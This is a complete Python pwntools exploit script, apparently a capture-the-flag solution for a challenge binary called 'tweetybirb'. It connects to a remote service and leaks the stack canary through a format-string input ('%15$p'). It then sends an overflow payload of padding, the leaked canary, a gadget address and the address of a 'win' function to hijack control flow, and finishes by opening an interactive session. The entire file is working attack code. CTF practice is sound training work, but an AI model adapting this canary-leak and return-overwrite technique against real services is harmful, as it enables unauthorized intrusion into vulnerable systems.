#!/usr/bin/python3

from pwn import *

p = remote("143.198.184.186", 5002)
#p = process("./tweetybirb")
e = ELF("./tweetybirb")
#context.log_level = 'debug'

p.sendlineafter("magpies?", "%15$p")
p.recvline()
canary = int(p.recvline().decode('utf-8').strip("\n"), 16)

padding = "A"*72

payload = padding.encode('utf-8')
payload += p64(canary)
payload += "DEADBEEF".encode('utf-8')
payload += p64(0x00401364)
payload += p64(e.sym['win'])

sleep(0.5)
p.sendlineafter("fowl?", payload)

p.interactive()
